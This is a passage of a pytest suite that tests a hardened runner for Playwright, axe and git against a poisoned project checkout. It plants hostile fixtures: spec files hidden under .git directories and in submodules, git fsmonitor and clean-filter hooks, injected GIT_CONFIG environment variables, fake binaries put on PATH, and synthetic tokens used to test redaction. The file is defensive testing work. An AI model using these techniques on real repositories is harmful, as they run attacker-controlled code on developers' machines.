    assert "dist/a.spec.ts (filter-collision)" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert proj.stub_calls("playwright") == []


def test_mutation_e3_off_turns_filter_collision_red(proj, dr):
    proj.write("dist/tests/visual/checkout.spec.ts", "// planted\n")
    o, s = proj.order([RUN_UI])
    res = proj.run(dr, o, s, patches=[(dr, "_e3_check", lambda *a, **k: [])], audit=False)
    assert res.code == 0 and proj.stub_calls("playwright")


def _git_only_candidates(ctx):
    """The iter-1 lookup: candidates as git lists them (blind under any directory named `.git`)."""
    return ctx.git.z(["ls-files", "-z"]) + ctx.git.z(["ls-files", "--others", "-z"])


def test_design_run_filter_collision_nested_repo_in_ignored_dir(proj, dr):
    """F-1: git does not descend into a nested repository. The file-system walk sees the spec
    (first layer); the nested-repo check stays as a second layer."""
    nested = proj.root / "dist" / "n"
    nested.mkdir(parents=True)
    gitiso.git_isolated(["init", "-q"], proj.tmp, cwd=nested)
    (nested / "tests/visual").mkdir(parents=True)
    (nested / "tests/visual/checkout.spec.ts").write_text("// planted inside a nested repo\n")
    o, s = proj.order([RUN_UI])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert "dist/n/ (nested-repo)" in err and "dist/n/tests/visual/checkout.spec.ts (filter-collision)" in err
    o, s = proj.order([RUN_UI], it=2)                                   # one layer off: still blocked
    err = blocked(proj.run(dr, o, s, patches=[(dr, "_nested_repo_check", lambda *a, **k: [])]),
                  "design-run-untrusted-input")
    assert "dist/n/tests/visual/checkout.spec.ts (filter-collision)" in err
    o, s = proj.order([RUN_UI], it=3)                                   # both layers off: red
    res = proj.run(dr, o, s, patches=[(dr, "_nested_repo_check", lambda *a, **k: []),
                                      (dr, "_e3_candidate_files", _git_only_candidates)], audit=False)
    assert res.code == 0 and proj.stub_calls("playwright")


# Sentinel W12 S-1: Playwright walks into every directory named `.git`; git lists none of them.
GITDIR_CASES = [
    ("V1", ".git/zz/tests/states/checkout.spec.ts", RUN_STATE),
    ("V2", ".git/evil.spec.ts", RUN_DIFF),
    ("V3", "tests/.git/x/tests/states/checkout.spec.ts", RUN_STATE),   # a plain dir, not a repository
]


@pytest.mark.parametrize("name,planted,run", GITDIR_CASES)
def test_design_run_filter_collision_under_dot_git(proj, dr, name, planted, run):
    proj.write(planted, "require('fs').writeFileSync('PWNED', '1');\n")
    o, s = proj.order([run])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert "%s (filter-collision)" % planted in err, err
    assert proj.stub_calls("playwright") == []


@pytest.mark.parametrize("name,planted,run", GITDIR_CASES)
def test_mutation_git_only_lookup_turns_dot_git_collision_red(proj, dr, name, planted, run):
    proj.write(planted, "require('fs').writeFileSync('PWNED', '1');\n")
    o, s = proj.order([run])
    res = proj.run(dr, o, s, patches=[(dr, "_e3_candidate_files", _git_only_candidates)], audit=False)
    assert res.code == 0 and proj.stub_calls("playwright")  # the iter-1 lookup lets it run


def test_e3_walk_matches_playwright_collect_files(tmp_path, dr):
    """scandir, no symlink followed, only `node_modules` skipped (at any depth), `.git` entered."""
    r = tmp_path / "w"
    for rel in (".git/a.spec.ts", "x/.git/y/b.spec.ts", "src/c.ts", "node_modules/p/d.spec.ts",
                "src/node_modules/e.spec.ts", "outside/f.spec.ts"):
        (r / rel).parent.mkdir(parents=True, exist_ok=True)
        (r / rel).write_text("x")
    os.symlink(str(r / "outside"), str(r / "linkdir"))
    os.symlink(str(r / "src/c.ts"), str(r / "link.spec.ts"))
    os.mkfifo(str(r / "fifo.spec.ts"))
    (r / "node_modules.txt").write_text("a file named like the skipped dir is kept")
    assert sorted(dr._fs_walk(str(r))) == [".git/a.spec.ts", "node_modules.txt", "outside/f.spec.ts",
                                           "src/c.ts", "x/.git/y/b.spec.ts"]


def test_e3_walk_caps_fail_closed(proj, dr):
    o, s = proj.order([RUN_UI])
    err = blocked(proj.run(dr, o, s, patches=[(dr, "WALK_MAX_ENTRIES", 5)]), "design-run-untrusted-input")
    assert err.strip() == "BLOCKED: design-run-untrusted-input tree-walk (entry cap 5)"
    o, s = proj.order([RUN_UI], it=2)
    err = blocked(proj.run(dr, o, s, patches=[(dr, "WALK_MAX_SECONDS", -1.0)]), "design-run-untrusted-input")
    assert err.strip() == "BLOCKED: design-run-untrusted-input tree-walk (time cap -1s)"
    if os.geteuid() != 0:                                     # chmod 0 does not stop root
        locked = proj.root / "dist" / "locked"
        locked.mkdir(parents=True)
        locked.chmod(0)
        try:
            o, s = proj.order([RUN_UI], it=3)
            err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
            assert "tree-walk (dist/locked: Permission denied)" in err
        finally:
            locked.chmod(0o755)
    o, s = proj.order([RUN_SHOT], nn="03")                    # no E3 template: no walk, no cap
    assert proj.run(dr, o, s, patches=[(dr, "WALK_MAX_ENTRIES", 5)]).code == 0


def test_e3_walk_skips_node_modules_like_playwright(proj, dr):
    proj.write("node_modules/pkg/tests/visual/checkout.spec.ts", "// a package's own test\n")
    o, s = proj.order([RUN_UI])
    assert proj.run(dr, o, s).code == 0


def test_design_run_os_file_dir(proj, dr):
    proj.write(".DS_Store/tests/visual/checkout.spec.ts", "// planted\n")      # (a)
    o, s = proj.order([RUN_STATE])
    assert ".DS_Store/" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    import shutil
    shutil.rmtree(proj.root / ".DS_Store")
    proj.write(".DS_Store/helper.js", "// planted\n")                         # (b)
    o, s = proj.order([RUN_SHOT], it=2)
    assert ".DS_Store/" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    shutil.rmtree(proj.root / ".DS_Store")
    os.symlink("../../x.js", proj.root / "tests/visual/Thumbs.db")            # (c)
    o, s = proj.order([RUN_SHOT], it=3)
    assert "tests/visual/Thumbs.db" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    os.remove(proj.root / "tests/visual/Thumbs.db")
    proj.write("tests/visual/.ds_store", "x")                                 # (e)
    o, s = proj.order([RUN_SHOT], nn="03")
    assert "tests/visual/.ds_store" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    os.remove(proj.root / "tests/visual/.ds_store")
    proj.write("tests/visual/.DS_Store", "x")                                 # (d)
    o, s = proj.order([RUN_UI], nn="04")
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    assert any(t["rule"] == "inert-os-file" for t in res.report["tree_check"])


def test_mutation_os_file_regular_check_off_turns_os_file_dir_red(proj, dr):
    loose = lambda entry, root: os.path.basename(entry.rstrip("/")) in dr.INERT_BASENAMES  # noqa: E731
    proj.write(".DS_Store/tests/visual/checkout.spec.ts", "// planted\n")     # (a)
    o, s = proj.order([RUN_STATE])
    res = proj.run(dr, o, s, patches=[(dr, "_inert_os_file", loose)], audit=False)
    assert res.code == 0
    import shutil
    shutil.rmtree(proj.root / ".DS_Store")
    os.symlink("../../x.js", proj.root / "tests/visual/Thumbs.db")            # (c)
    o, s = proj.order([RUN_SHOT], it=2)
    res = proj.run(dr, o, s, patches=[(dr, "_inert_os_file", loose)], audit=False)
    assert res.code == 0


def test_design_run_index_flags(proj, dr):
    proj.write("tests/visual/helpers.ts", "export const a = 1;\n")
    proj.commit("helpers")
    proj.write("tests/visual/helpers.ts", "export const a = require('../../evil');\n")
    proj.git("update-index", "--assume-unchanged", "tests/visual/helpers.ts")
    o, s = proj.order([RUN_UI])
    assert "tests/visual/helpers.ts (index-flag h)" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    proj.git("update-index", "--no-assume-unchanged", "tests/visual/helpers.ts")
    proj.git("update-index", "--skip-worktree", "tests/visual/helpers.ts")
    o, s = proj.order([RUN_UI], it=2)
    assert "tests/visual/helpers.ts (index-flag S)" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    os.remove(proj.root / "tests/visual/helpers.ts")                           # skip-worktree, absent
    o, s = proj.order([RUN_UI], it=3)
    assert proj.run(dr, o, s).code == 0
    proj.git("update-index", "--no-skip-worktree", "tests/visual/helpers.ts")
    proj.git("checkout", "--", "tests/visual/helpers.ts")
    proj.git("update-index", "--assume-unchanged", "tests/visual/helpers.ts")  # flag set, unmodified
    o, s = proj.order([RUN_UI], nn="03")
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    assert any(f["path"] == "tests/visual/helpers.ts" and f["result"] == "verified"
               for f in res.report["git"]["index_flags"])


def test_mutation_index_flag_check_off_turns_index_flags_red(proj, dr):
    proj.write("tests/visual/helpers.ts", "export const a = 1;\n")
    proj.commit("helpers")
    proj.write("tests/visual/helpers.ts", "export const a = 2;\n")
    proj.git("update-index", "--assume-unchanged", "tests/visual/helpers.ts")
    o, s = proj.order([RUN_UI])
    res = proj.run(dr, o, s, patches=[(dr, "_index_flag_check", lambda *a, **k: [])], audit=False)
    assert res.code == 0


# ------------------------------------------------------------------------------------------------
# SAC-26: no repository-controlled command before validation
# ------------------------------------------------------------------------------------------------

def test_design_run_git_fsmonitor(proj, dr):
    proj.git("config", "core.fsmonitor", str(proj.hostile("fsmonitor")))
    o, s = proj.order([RUN_PAIR])
    assert "git-config core.fsmonitor" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert proj.hostiles() == []
    o, s = proj.order([RUN_PAIR], it=2)                         # scan disabled: -c override holds
    res = proj.run(dr, o, s, patches=[(dr, "_deny_key", lambda k, v: False)], audit=False)
    assert res.code == 0 and proj.hostiles() == []


def test_mutation_config_scan_and_c_flags_off_turns_git_fsmonitor_red(proj, dr):
    proj.git("config", "core.fsmonitor", str(proj.hostile("fsmonitor")))
    o, s = proj.order([RUN_PAIR])
    weak = ("--no-optional-locks", "--no-pager")
    proj.run(dr, o, s, patches=[(dr, "_deny_key", lambda k, v: False), (dr, "SAFE_GIT_PREFIX", weak)],
             audit=False)
    assert proj.hostiles() == ["HOSTILE-fsmonitor"]


def test_design_run_git_filter(proj, dr):
    proj.write(".gitattributes", "*.txt filter=x\n")
    proj.write("a.txt", "content\n")
    proj.commit("attrs")
    proj.git("config", "filter.x.clean", str(proj.hostile("filter")))
    future = time.time() + 5
    os.utime(proj.root / "a.txt", (future, future))  # stat-dirty, content unchanged
    o, s = proj.order([RUN_PAIR])
    assert "git-config filter.x.clean" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert proj.hostiles() == []
    proj.git("status", "--porcelain")                 # positive control (I-2): plain status runs it
    assert proj.hostiles() == ["HOSTILE-filter"]


def _relative_path_fixture(proj):
    with open(proj.root / ".gitignore", "a") as fh:  # planted binaries hidden by tracked rules (worst case)
        fh.write("relbin/\nbin/\n")
    proj.commit("ignore bins")
    for d in ("relbin", "node_modules/.bin", "bin"):
        for tool in ("git", "node"):
            p = proj.root / d / tool
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(HOSTILE.format(mark=proj.markers / ("HOSTILE-%s-%s" % (d.replace("/", "_"), tool))))
            p.chmod(0o755)
    path = "relbin::./node_modules/.bin:%s/bin:%s:/usr/bin:/bin" % (proj.root, proj.sysbin)
    return path, proj.order([RUN_AXE])


def _check_relative_path(proj, res):
    assert res.code == 0, res.err
    assert proj.hostiles() == []
    assert not res.report["git"]["path"].startswith(str(proj.root))
    child_path = proj.stub_calls("axe")[0]["env"]["PATH"].split(":")
    assert child_path == [str(proj.sysbin), "/usr/bin", "/bin"]
    assert res.report["path_sanitised"] == child_path


def test_design_run_relative_path(proj, dr):
    path, (o, s) = _relative_path_fixture(proj)
    _check_relative_path(proj, proj.run(dr, o, s, path=path))


def test_mutation_path_sanitising_off_turns_relative_path_red(proj, dr):
    path, (o, s) = _relative_path_fixture(proj)
    raw = lambda value, root: [e for e in value.split(":")]  # noqa: E731
    res = proj.run(dr, o, s, path=path, patches=[(dr, "_sanitise_path", raw)], audit=False)
    with pytest.raises(AssertionError):
        _check_relative_path(proj, res)
    # the second layer still held: the planted git was never executed (absolute-git check)
    assert res.err.startswith("BLOCKED: design-run-tool-unsafe git")
    assert proj.hostiles() == []


def test_design_run_git_env(proj, dr):
    other = proj.tmp / "other"
    other.mkdir()
    gitiso.git_isolated(["init", "-q"], proj.tmp, cwd=other)
    extra = {"GIT_DIR": str(other / ".git"), "GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "core.fsmonitor",
             "GIT_CONFIG_VALUE_0": str(proj.hostile("gitenv")), "GIT_CONFIG_PARAMETERS": "'core.fsmonitor'='x'"}
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, extra_env=extra)
    assert res.code == 0, res.err
    assert proj.hostiles() == []
    assert not [k for k in proj.stub_calls("axe")[0]["env"] if k.startswith("GIT_")]


def test_design_run_submodule(proj, dr):
    src = proj.tmp / "subsrc"
    src.mkdir()
    gitiso.git_isolated(["init", "-q"], proj.tmp, cwd=src)
    (src / ".gitattributes").write_text("* filter=y\n")
    (src / "a.txt").write_text("a\n")
    gitiso.git_isolated(["add", "-A"], proj.tmp, cwd=src)
    gitiso.git_isolated(["commit", "-qm", "s"], proj.tmp, cwd=src)
    proj.git("-c", "protocol.file.allow=always", "submodule", "add", "-q", str(src), "sub")
    proj.commit("sub")
    mod_cfg = proj.root / ".git/modules/sub/config"
    with open(mod_cfg, "a") as fh:
        fh.write('[filter "y"]\n\tclean = %s\n' % proj.hostile("subfilter"))
    future = time.time() + 5
    os.utime(proj.root / "sub/a.txt", (future, future))  # stat-dirty, content unchanged (Sentinel note)

    # (a) filter variant
    o, s = proj.order([RUN_PAIR])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input submodule")
    assert "submodule .git/modules/sub" in err and "submodule sub" in err
    assert proj.hostiles() == []
    proj.git("status", "--porcelain")  # unflagged control: the submodule's clean filter DOES run
    assert proj.hostiles() == ["HOSTILE-subfilter"]
    os.remove(proj.markers / "HOSTILE-subfilter")

    # (b) spec variant, state-tests and visual-diff
    (proj.root / "sub/tests/states").mkdir(parents=True)
    (proj.root / "sub/tests/states/checkout.spec.ts").write_text("// planted\n")
    (proj.root / "sub/tests/visual").mkdir(parents=True)
    (proj.root / "sub/tests/visual/checkout.spec.ts").write_text("// planted\n")
    for i, run in enumerate((RUN_STATE, RUN_DIFF), 2):
        o, s = proj.order([run], it=i)
        blocked(proj.run(dr, o, s), "design-run-untrusted-input submodule")
    assert proj.stub_calls("playwright") == []

    # (c) gitfile only, git dir elsewhere
    import shutil
    elsewhere = proj.tmp / "elsewhere"
    elsewhere.mkdir()
    shutil.move(str(proj.root / ".git/modules/sub"), str(elsewhere / "sub"))
    shutil.rmtree(proj.root / ".git/modules")
    (proj.root / "sub/.git").write_text("gitdir: %s\n" % (elsewhere / "sub"))
    o, s = proj.order([RUN_PAIR], nn="03")
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input submodule sub")
    assert "(populated)" not in err

    # (d) populated without .git
    os.remove(proj.root / "sub/.git")
    o, s = proj.order([RUN_PAIR], nn="04")
    assert "submodule sub (populated)" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")

    # (e) uninitialized: gitlink recorded, empty directory, no .git/modules -> runs
    shutil.rmtree(proj.root / "sub")
    (proj.root / "sub").mkdir()
    o, s = proj.order([RUN_UI], nn="05")
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    assert res.report["git"]["gitlinks"] == [{"path": "sub", "state": "empty"}]
    assert proj.hostiles() == []


def _submodule_with_filter(proj):
    src = proj.tmp / "subsrc"
    src.mkdir()
    gitiso.git_isolated(["init", "-q"], proj.tmp, cwd=src)
    (src / ".gitattributes").write_text("* filter=y\n")
    (src / "a.txt").write_text("a\n")
    gitiso.git_isolated(["add", "-A"], proj.tmp, cwd=src)
    gitiso.git_isolated(["commit", "-qm", "s"], proj.tmp, cwd=src)
    proj.git("-c", "protocol.file.allow=always", "submodule", "add", "-q", str(src), "sub")
    proj.commit("sub")
    with open(proj.root / ".git/modules/sub/config", "a") as fh:
        fh.write('[filter "y"]\n\tclean = %s\n' % proj.hostile("subfilter"))
    future = time.time() + 5
    os.utime(proj.root / "sub/a.txt", (future, future))


def test_mutation_e0_off_turns_submodule_b_red(proj, dr):
    _submodule_with_filter(proj)
    (proj.root / "sub/tests/states").mkdir(parents=True)
    (proj.root / "sub/tests/states/checkout.spec.ts").write_text("// planted\n")
    o, s = proj.order([RUN_STATE])
    e0_off = (dr, "_e0_check", lambda *a, **k: ([], []))
    err = blocked(proj.run(dr, o, s, patches=[e0_off]), "design-run-untrusted-input")
    assert "sub/tests/states/checkout.spec.ts (filter-collision)" in err  # the E3 walk is a second layer
    o, s = proj.order([RUN_STATE], it=2)
    res = proj.run(dr, o, s, patches=[e0_off, (dr, "_e3_candidate_files", _git_only_candidates)], audit=False)
    assert res.code == 0 and proj.stub_calls("playwright")  # git-based E2/E3 cannot see inside the submodule


def test_mutation_e0_and_ignore_submodules_off_turns_submodule_a_red(proj, dr):
    _submodule_with_filter(proj)
    o, s = proj.order([RUN_PAIR])
    proj.run(dr, o, s, patches=[(dr, "_e0_check", lambda *a, **k: ([], [])), (dr, "STATUS_EXTRA", ())], audit=False)
    assert "HOSTILE-subfilter" in proj.hostiles()


def _audit_wrapper(proj):
    wrap = proj.tmp / "gitwrap"
    wrap.mkdir(exist_ok=True)
    log = proj.tmp / "git-audit.jsonl"
    (wrap / "git").write_text(
        SHEBANG + "\nimport json, os, sys\n"
        "open(%r, 'a').write(json.dumps({'argv': sys.argv[1:], 'cwd': os.getcwd()}) + '\\n')\n"
        "os.execv(%r, [%r] + sys.argv[1:])\n" % (str(log), gitiso.GIT_ABS, gitiso.GIT_ABS))
    (wrap / "git").chmod(0o755)
    return "%s:%s:/usr/bin:/bin" % (wrap, proj.sysbin), log


def _sub(call):
    return call["argv"][len(SAFE_PREFIX)] if len(call["argv"]) > len(SAFE_PREFIX) else None


def _check_order(entries):
    """Order pins over the git calls plus the phase marks `_audit_marks` writes into the same log.
    C13-1: after step 7 (`prepared`) and after each child's post-run phase (`post-run`), the first
    git call is E0's `ls-files -s`, before that run's first `status`. S13-3: every `status` comes
    after a config re-scan, with only `ls-files` listings between them."""
    git = [e for e in entries if "argv" in e]
    for i, c in enumerate(git):
        if _sub(c) == "status":
            j = max(k for k in range(i) if _sub(git[k]) in ("config", "status"))
            assert _sub(git[j]) == "config", ("status without a config re-scan before it", git[j:i + 1])
            assert all(_sub(git[k]) == "ls-files" for k in range(j + 1, i)), git[j:i + 1]
    for n, e in enumerate(entries):
        if e.get("mark") not in ("prepared", "post-run"):
            continue
        segment = []
        for later in entries[n + 1:]:
            if "mark" in later:
                if later["mark"] == "child":
                    break
                continue
            segment.append(later)
        if segment:
            assert segment[0]["argv"][len(SAFE_PREFIX):][:2] == ["ls-files", "-s"], (e, segment[:3])


def _check_audit(calls):
    _check_order(calls)
    calls = [c for c in calls if "argv" in c]
    assert calls[0]["argv"] == ["--version"] and calls[0]["cwd"] == "/"
    assert calls[1]["argv"][len(SAFE_PREFIX):] == ["config", "--list", "--show-origin", "--show-scope", "-z"]
    first_status = next((i for i, c in enumerate(calls) if "status" in c["argv"]), None)
    lsfiles_s = next(i for i, c in enumerate(calls) if c["argv"][len(SAFE_PREFIX):][:2] == ["ls-files", "-s"])
    if first_status is not None:
        assert lsfiles_s < first_status
    for c in calls[1:]:
        assert c["argv"][:len(SAFE_PREFIX)] == SAFE_PREFIX, c
        sub = c["argv"][len(SAFE_PREFIX)]
        assert sub not in ("submodule", "add", "update-index", "stash", "checkout"), c
        if sub == "config":
            assert c["argv"][len(SAFE_PREFIX):] == ["config", "--list", "--show-origin", "--show-scope", "-z"]
        if sub == "status":
            assert "--ignore-submodules=all" in c["argv"], c


def test_git_argv_audit(proj, dr):
    path, log = _audit_wrapper(proj)
    o, s = proj.order([RUN_UI])
    res = proj.run(dr, o, s, path=path)
    assert res.code == 0, res.err
    calls = [json.loads(line) for line in log.read_text().splitlines()]
    assert any("status" in c["argv"] for c in calls)
    _check_audit(calls)
    log.unlink()
    _submodule_with_filter(proj)
    o, s = proj.order([RUN_UI], it=2)
    blocked(proj.run(dr, o, s, path=path), "design-run-untrusted-input submodule")
    _check_audit([json.loads(line) for line in log.read_text().splitlines()])
    assert proj.hostiles() == []


def test_mutation_ignore_submodules_off_turns_git_argv_audit_red(proj, dr):
    path, log = _audit_wrapper(proj)
    o, s = proj.order([RUN_UI])
    proj.run(dr, o, s, path=path, patches=[(dr, "STATUS_EXTRA", ())], audit=False)
    with pytest.raises(AssertionError):
        _check_audit([json.loads(line) for line in log.read_text().splitlines()])


def _version_wrapper(proj, version, fail_scope=False):
    wrap = proj.tmp / "gitver"
    wrap.mkdir(exist_ok=True)
    body = (SHEBANG + "\nimport os, sys\n"
            "if sys.argv[1:] == ['--version']:\n    print(%r); sys.exit(0)\n" % version)
    if fail_scope:
        body += "if '--show-scope' in sys.argv:\n    sys.exit(129)\n"
    body += "os.execv(%r, [%r] + sys.argv[1:])\n" % (gitiso.GIT_ABS, gitiso.GIT_ABS)
    (wrap / "git").write_text(body)
    (wrap / "git").chmod(0o755)
    return "%s:%s:/usr/bin:/bin" % (wrap, proj.sysbin)


def test_design_run_git_version(proj, dr):
    o, s = proj.order([RUN_PAIR])
    err = blocked(proj.run(dr, o, s, path=_version_wrapper(proj, "git version 2.25.1")), "design-run-tool-unsafe")
    assert err.strip() == "BLOCKED: design-run-tool-unsafe git (version git version 2.25.1)"
    o, s = proj.order([RUN_PAIR], it=2)
    err = blocked(proj.run(dr, o, s, path=_version_wrapper(proj, "git version 2.30.0", fail_scope=True)),
                  "design-run-tool-unsafe git")
    proj.git("config", "core.fsmonitor", str(proj.hostile("fsmon-version")))
    o, s = proj.order([RUN_PAIR], it=3)
    path, log = _audit_wrapper(proj)
    blocked(proj.run(dr, o, s, path=path), "design-run-untrusted-input git-config core.fsmonitor")
    first = json.loads(log.read_text().splitlines()[0])
    assert first == {"argv": ["--version"], "cwd": "/"}
    assert proj.hostiles() == []


def test_mutation_version_gate_off_turns_git_version_red(proj, dr):
    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, path=_version_wrapper(proj, "git version 2.25.1"),
                   patches=[(dr, "MIN_GIT", (0, 0))], audit=False)
    assert res.code == 0


def test_design_run_git_include_origin(proj, dr):
    evil = proj.write("evil.cfg", '[filter "z"]\n\tclean = cat\n')
    proj.commit("cfg")
    home_cfg = proj.tmp / "home" / ".gitconfig"
    home_cfg.write_text("[include]\n\tpath = %s\n" % evil)
    o, s = proj.order([RUN_PAIR])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input git-config filter.z.clean")
    assert "(file:%s)" % evil in err
    link = proj.tmp / "link"
    os.symlink(str(proj.root), str(link))
    home_cfg.write_text("[include]\n\tpath = %s\n" % (link / "evil.cfg"))  # through a symlink
    o, s = proj.order([RUN_PAIR], it=2)
    blocked(proj.run(dr, o, s), "design-run-untrusted-input git-config filter.z.clean")
    o, s = proj.order([RUN_PAIR], it=3)                                     # root reached via symlink
    blocked(proj.run(dr, o, s, cwd=link), "design-run-untrusted-input git-config filter.z.clean")
    # Chris C13b-2 (D-3): an origin with a newline prints JSON-escaped on one line; one that also
    # holds a token is withheld whole
    for nn, name in (("03", "ev\nil.cfg"), ("04", "ev\n" + SECRETS["ghp"] + ".cfg")):
        odd = proj.write(name, '[filter "z"]\n\tclean = cat\n')
        quoted = str(odd).replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
        home_cfg.write_text('[include]\n\tpath = "%s"\n' % quoted)
        o, s = proj.order([RUN_PAIR], nn=nn)
        err = blocked(proj.run(dr, o, s), "design-run-untrusted-input git-config filter.z.clean")
        assert err.count("\n") == 1 and err.endswith("\n"), err
        if nn == "03":
            assert "(%s)" % json.dumps("file:" + str(odd)) in err, err
        else:
            assert "filter.z.clean (<REDACTED>)" in err and SECRETS["ghp"] not in err, err
        odd.unlink()


def test_mutation_string_origin_compare_turns_include_origin_red(proj, dr):
    evil = proj.write("evil.cfg", '[filter "z"]\n\tclean = cat\n')
    proj.commit("cfg")
    link = proj.tmp / "link"
    os.symlink(str(proj.root), str(link))
    (proj.tmp / "home" / ".gitconfig").write_text("[include]\n\tpath = %s\n" % (link / "evil.cfg"))
    o, s = proj.order([RUN_PAIR])

    def string_compare(path, anchors):
        p = os.path.abspath(path)
        return any(p == a or p.startswith(a + os.sep) for a in anchors)

    res = proj.run(dr, o, s, patches=[(dr, "_origin_in_project", string_compare)], audit=False)
    assert res.code == 0 and evil.exists()


# ------------------------------------------------------------------------------------------------
# SAC-27 and X15: redaction and artifact staging
# ------------------------------------------------------------------------------------------------

SECRETS = {
    "bearer": "s3cr3tBearerValue", "dbpass": "dbpass99", "ghp": "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
    "pem": "MIIEsecretPEMbodyLine", "argv": "argvtok3n", "artifact": "artifactS3cret",
}


def _all_output_bytes(proj):
    """Everything the runner wrote under outputs/ (the order and request are its inputs)."""
    data = b""
    for p in (proj.root / "outputs" / TASK / "design-run").rglob("*"):
        if p.is_file():
            data += p.read_bytes()
    return data


def _redaction_fixture(proj):
    pem = ("-----BEGIN RSA " + "PRIVATE KEY-----\n%s\n-----END RSA " + "PRIVATE KEY-----\n") % SECRETS["pem"]
    proj.set_ctl("axe", stdout="Authorization: Bearer %s\npostgres://u:%s@h/db\n%s\n%s" % (
        SECRETS["bearer"], SECRETS["dbpass"], SECRETS["ghp"], pem),
        stderr="password=%s\n" % SECRETS["dbpass"],
        save_text=json.dumps({"api_key": SECRETS["artifact"], "note": "Bearer " + SECRETS["bearer"]}))
    return proj.order([{"id": "r1", "script_id": "axe-scan",
                        "params": {"url": "http://localhost:3000/?token=%s" % SECRETS["argv"]}}])


def test_design_run_output_redaction(proj, dr):
    o, s = _redaction_fixture(proj)
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    data = _all_output_bytes(proj)
    for name, secret in SECRETS.items():
        assert secret.encode() not in data, name
    assert b"<REDACTED>" in data
    red = res.run("r1")["redactions"]
    assert red["stdout"] >= 4 and red["stderr"] >= 1 and red["argv"] >= 1 and red["artifacts"] >= 1
    assert "token=<REDACTED>" in res.run("r1")["argv"][1]
    assert list((proj.tmp / "runner-tmp").iterdir()) == []  # private directory removed at exit
    assert proj.stub_calls("axe")[0]["argv"][0].endswith(SECRETS["argv"])  # the child got the real value


def test_mutation_redaction_off_turns_output_redaction_red(proj, dr):
    o, s = _redaction_fixture(proj)
    proj.run(dr, o, s, patches=[(dr, "_redact", lambda text: (text, 0))], audit=False)
    data = _all_output_bytes(proj)
    assert any(secret.encode() in data for secret in SECRETS.values())


def test_redaction_patterns_unit(dr):
    cases = {
        "Authorization: Bearer abc": "abc", "Cookie: sid=zzz123": "zzz123",
        '{"client_secret": "cs-value-1"}': "cs-value-1", "x-api-key=K123": "K123",
        "https://bob:hunter2@example.com/": "hunter2", "Basic dXNlcjpwYXNzd29yZA==": "dXNlcjpwYXNzd29yZA",
        # synthetic tokens are built by concatenation so secret scanners do not read them as real (Sentinel I-2)
        "xox" + "b-1234567890-abcdefghij": "xox" + "b-1234567890",
        "AKIA" + "ABCDEFGHIJKLMNOP": "AKIA" + "ABCDEFGHIJKLMNOP",
        "glp" + "at-abcdefghijklmnopqrst": "glp" + "at-abcdef", "npm" + "_abcdefghijklmnopqrstuvwxyz0123456789": "npm" + "_abc",
        "sk-" + "ant-api03-abcdefghijklmnop": "sk-" + "ant-api03", "eyJhbGciOi.eyJzdWIiOiIx.c2lnbmF0dXJl": "eyJzdWIiOiIx",
        "github_" + "pat_11ABCDEFG0123456789_abc": "github_" + "pat_11ABC",
    }
    for text, secret in cases.items():
        out, n = dr._redact(text)
        assert secret not in out and n >= 1, (text, out)
    doc = json.dumps({"password": 'a"b', "colors": {"primary": "#112233"}})
    out, _ = dr._redact(doc)
    assert json.loads(out) == {"password": "<REDACTED>", "colors": {"primary": "#112233"}}
    assert dr._redact("design tokens and colours, nothing secret") == ("design tokens and colours, nothing secret", 0)


def test_design_run_artifact_staging(proj, dr):
    proj.set_ctl("axe", save_text=json.dumps({"authorization": "Bearer abc-artifact"}),
                 extra_files={"extra.txt": "undeclared"})
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    run = res.run("r1")
    saved = proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter1/r1.axe.json"
    assert json.loads(saved.read_text()) == {"authorization": "<REDACTED>"}
    assert run["redactions"]["artifacts"] >= 1
    assert {"name": "extra.txt", "reason": "undeclared"} in run["dropped"]
    assert run["artifacts"][0]["sha256"] == hashlib.sha256(saved.read_bytes()).hexdigest()
    assert run["argv"][-2:] == ["--save", "r1.axe.json"], run["argv"]
    assert not run["argv"][run["argv"].index("--dir") + 1].startswith(str(proj.root)), run["argv"]
    # (c) symlink artifact -> dropped
    proj.set_ctl("axe", save_text="{}", save_as_symlink=True)
    o, s = proj.order([RUN_AXE], it=2)
    run = proj.run(dr, o, s).run("r1")
    assert any(d["name"] == "r1.axe.json" and d["reason"].startswith("not-regular") for d in run["dropped"])
    assert not (proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter2/r1.axe.json").exists()


def _kill_fixture(proj):
    flag = proj.tmp / "saved.flag"
    proj.set_ctl("axe", save_text=json.dumps({"authorization": "Bearer abc-killed"}), sleep=20,
                 saved_flag=str(flag))
    order, sha = proj.order([RUN_AXE])
    return order, sha, flag


def _kill_and_check(proj, p, flag):
    deadline = time.time() + 30
    while not flag.exists() and time.time() < deadline:
        time.sleep(0.05)
    assert flag.exists(), "stub never wrote its artifact"
    os.killpg(p.pid, signal.SIGKILL)
    p.wait(10)
    try:
        os.kill(int(flag.read_text()), signal.SIGKILL)
    except (ProcessLookupError, ValueError):
        pass
